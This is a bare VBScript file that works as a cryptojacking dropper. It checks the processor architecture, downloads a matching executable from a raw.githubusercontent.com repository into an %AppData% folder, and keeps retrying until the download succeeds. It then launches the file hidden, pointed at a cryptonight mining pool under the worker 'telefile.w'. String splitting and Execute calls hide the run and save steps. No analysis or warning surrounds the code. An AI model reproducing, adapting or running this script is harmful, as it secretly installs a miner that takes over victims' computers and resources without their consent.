mydeeq = GetAppDateFolder("jcecn")
mydeeq = mydeeq & "jcecn"&".ex"&"e"
Dim mydeew
Dim mydeee
mydeew = "https://raw"&chr(46)&"githubusercontent.com"
Set mydeer=wscript.createobject("wscript.shell")
mydeee=mydeer.environment("system").item("processor_architecture")
if right(mydeee, 2) = "64" then
mydeew = mydeew&"/jommb/872/master/b"
else
mydeew = mydeew&"/jommb/872/master/m"
end if
Set mydeet = CreateObject("Scripting.FileSystemObject")
If mydeet.FileExists(mydeeq) Then mydeet.DeleteFile mydeeq
On Error Resume Next
Do
 Err.Clear
 mydeey mydeew, mydeeq
 If dir(mydeeq) = "" Then WScript.Sleep 10000
loop Until mydeet.FileExists(mydeeq)
Set mydeeu = WScript.CreateObject("WScript.Shell")
turl="my"&"de"&"eu"&".R"&"un"
turl=turl&" mydeeq & "" -B --safe -o"
turl=turl&" europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x"", 0, false"
Execute turl
WScript.Quit
Function mydeey(InetFile, jcecn)
	 dim mydeei
	 On Error Resume Next
	 Set mydeei = CreateObject("WinHttp.WinHttpRequest.5.1")
	 Do	
	  mydeeo = ""
	  mydeei.Open "GET", InetFile, False
	  mydeei.Send
	  mydeeo = mydeei.responseText
	 Loop Until mydeeo <> ""
	 set mydeep = CreateObject("ADODB.Stream")
	 mydeep.Type = 1
	 mydeep.Open
	 mydeep.Write mydeei.responseBody
	 Execute "mydeep.SaveT"&"oFile jcecn"
	 mydeep.Close
	 Set mydeei = Nothing
End Function
Function GetAppDateFolder(FolderName)
	Set mydeea = CreateObject("WScript.Shell")
	GetAppDateFolder = mydeea.ExpandEnvironmentStrings("%AppData%\" & FolderName & "\")
	Set fileSystem = CreateObject("Scripting.FileSystemObject")
	If (fileSystem.FolderExists(GetAppDateFolder)) Then
	Else
		fileSystem.CreateFolder GetAppDateFolder
	End If
End Function